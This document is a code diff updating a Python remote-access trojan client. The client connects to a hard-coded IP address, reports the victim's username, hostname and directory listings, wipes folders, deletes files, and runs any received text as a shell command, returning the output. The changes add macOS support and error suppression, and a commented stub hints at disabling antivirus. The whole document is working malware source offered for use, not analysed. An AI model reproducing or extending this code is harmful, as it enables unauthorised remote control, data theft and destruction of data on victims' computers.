@@ -1,5 +1,6 @@
-import os, socket, threading
-ip = socket.gethostbyname(socket.gethostname())#for testing
+import os, socket, sys
+opsys = sys.platform
+ip = '192.168.0.115'#for testing
 '''
 windefdelname = 'Anti-Virus-Upgrader.bat'
 windefdelfile = open(windefdelname, 'w')
@@ -21,20 +22,29 @@ while True:
         msg = s.recv(1024)
         msg = msg.decode()
         if msg.lower().startswith('!getusername'):
-            login = os.getlogin()
-            msgtoserv = login.encode()
-            s.send(msgtoserv)
-            msg = ''
+            try:
+                login = os.getlogin()
+                msgtoserv = login.encode()
+                s.send(msgtoserv)
+                msg = ''
+            except:
+                pass
         elif msg.lower().startswith('!getvictimhost'):
-            hostname = socket.gethostname()
-            msgtoserv = hostname.encode()
-            s.send(msgtoserv)
-            msg = ''
+            try:
+                hostname = socket.gethostname()
+                msgtoserv = hostname.encode()
+                s.send(msgtoserv)
+                msg = ''
+            except:
+                pass
         elif msg.lower().startswith('!getvictimcwd'):
-            cwd = os.getcwd()
-            msgtoserv = cwd.encode()
-            s.send(msgtoserv)
-            msg = ''
+            try:
+                cwd = os.getcwd()
+                msgtoserv = cwd.encode()
+                s.send(msgtoserv)
+                msg = ''
+            except:
+                pass
         elif msg.lower().startswith('!changedir'):
             try:
                 msg = msg.split()
@@ -46,16 +56,19 @@ while True:
             except:
                 pass
         elif msg.lower().startswith('!listdir'):
-            listdir = os.listdir()
-            result = ""
-            for dire in listdir:
-                try:
-                    result = result + dire + ", "
-                except:
-                    pass
-            msgtoserv = result.encode()
-            s.send(msgtoserv)
-            msg = ''
+            try:
+                listdir = os.listdir()
+                result = ""
+                for dire in listdir:
+                    try:
+                        result = result + dire + ", "
+                    except:
+                        pass
+                msgtoserv = result.encode()
+                s.send(msgtoserv)
+                msg = ''
+            except:
+                pass
         elif msg.lower().startswith('!erasevictim'):
             pass
             '''
@@ -92,19 +105,22 @@ while True:
             except:
                 pass
         elif msg.lower().startswith('!wipefolder'):
-            msg = msg.split()
-            dirlist = os.listdir()
-            for file in dirlist:
-                try:
-                    os.rmdir(file)
-                except:
-                    pass
-            dirlist = os.listdir()
-            for file in dirlist:
-                try:
-                    os.remove(file)
-                except:
-                    pass
+            try:
+                msg = msg.split()
+                dirlist = os.listdir()
+                for file in dirlist:
+                    try:
+                        os.rmdir(file)
+                    except:
+                        pass
+                dirlist = os.listdir()
+                for file in dirlist:
+                    try:
+                        os.remove(file)
+                    except:
+                        pass
+            except:
+                pass
         elif msg.lower().startswith('!openfile'):
             try:
                 msg = msg.split()
@@ -152,7 +168,20 @@ while True:
         elif msg.lower().startswith('!startfile'):
             msg = msg.split()
             filename = msg[1]
-            os.startfile(filename)
+            try:
+                if opsys == "darwin":
+                    try:
+                        os.system(f'cd {os.getcwd}')
+                        os.system(f'open {filename}')
+                    except:
+                        pass
+                else:
+                    try:
+                        os.startfile(filename)
+                    except:
+                        pass
+            except:
+                pass
         elif msg.lower().startswith('!delfile'):
             try:
                 msg = msg.split()
@@ -168,14 +197,34 @@ while True:
                         pass
             except:
                 pass
+        elif msg.lower().startswith('!listips'):
+            pass
+        if msg.lower().startswith('!getos'):
+            if opsys == "darwin":
+                msgtoserv = "MacOS".encode()
+            elif opsys == "win32":
+                msgtoserv = "WindowsOS".encode()
+            else:
+                msgtoserv = opsys.encode()
+            s.send(msgtoserv)
         else:
-            os.system(msg)
-    except:
-        while True:
             try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.connect((ip, 80))
-                break
+                msgtoserv = os.popen(msg).readlines()
+                result = ""
+                for i in msgtoserv:
+                    result = result + i
+                s.send(result.encode())
             except:
-                s.close()
                 pass
+    except:
+        if socket.error:
+            while True:
+                try:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.connect((ip, 80))
+                    break
+                except:
+                    s.close()
+                    pass
+        else:
+            pass
